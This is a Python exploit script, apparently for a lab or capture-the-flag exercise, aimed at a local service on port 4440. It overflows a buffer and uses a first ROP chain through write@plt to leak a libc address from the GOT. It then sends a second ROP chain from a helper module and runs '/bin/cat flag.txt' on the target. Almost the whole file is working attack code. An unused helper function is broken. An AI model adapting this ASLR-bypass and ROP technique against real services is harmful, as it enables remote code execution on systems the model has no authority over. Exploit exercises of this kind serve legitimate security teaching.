import sys
import socket
from struct import pack
from struct import unpack
import mkrop



def p(a):
	struct.pack('Q', a)

#address = 'lettieri.iet.unipi.it'
address = 'localhost'
port = 4440

s = socket.create_connection((address, port))

padding = b'A' * (0x30 + 8)

write_plt = pack('Q', 0x401040)

setsockopt_got = pack('Q', 0x4033f8)

pop_rsi_r15 = pack('Q', 0x401579)

pop_rdi = pack('Q', 0x40157b)

setsockopt_offset = 0xff410


r = padding
r += pop_rsi_r15
r += setsockopt_got
r += b'B' * 8
r += write_plt
r += b'C' * (0x200 - len(r)) 

s.send(r)

s.recv(0x200)

result = s.recv(8)
#sys.stdout.buffer.write(result)
setsockopt_libc = unpack('Q', result)[0]

s.close()
libc = setsockopt_libc - setsockopt_offset  

s = socket.create_connection((address, port))

o = mkrop.rop(padding, libc)
o += b'K' * (0x200 - len(o))

s.send(o)
s.recv(0x200)

s.send(b'/bin/cat flag.txt\n')

sys.stdout.buffer.write(s.recv(0x200))




